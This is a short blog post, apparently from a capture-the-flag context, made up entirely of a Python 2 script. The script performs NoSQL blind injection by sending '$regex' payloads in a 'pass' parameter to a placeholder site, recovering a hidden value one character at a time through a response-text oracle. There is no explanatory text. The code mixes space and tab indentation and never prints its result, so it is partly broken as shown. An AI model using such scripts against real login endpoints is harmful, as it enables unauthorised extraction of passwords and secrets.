---
layout: post
title:  "No-SQL-Blind Injection script !"
date:   2017-01-30 14:45:00 +0100
categories: jekyll update
---

{% highlight python %}
#!/usr/bin/env python2                                                                                                                                                                                                                        

import urllib2
import time

def checkIfGood(param):
    response = urllib2.urlopen("http://www.vulnerable-site.com/index.php?name=user&pass[$regex]=" + param).read()
	print "[^]Trying " + param
	time.sleep(0.1)
	if response.find("This is not a valid flag") == -1:
		return (0)
	return (1)
							
CHARSET = "0123456789azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN@-_."

def main():
	i = 0
	tmp = ""
	while i < len(CHARSET):
		tmp += CHARSET[i]
		if checkIfGood(tmp + '.' + '{' + str(21 - len(tmp)) + '}') == 1:
			tmp = tmp[:-1]
		else:
			i = -1
		i = i + 1
																								
def check_nb_chars():
	i = 0
	while i < 100:
		if checkIfGood(".{" + str(i) + "}") == 0:
			print "OK : " + str(i)
		i = i + 1

# check_nb_chars()
main()
{% endhighlight %}
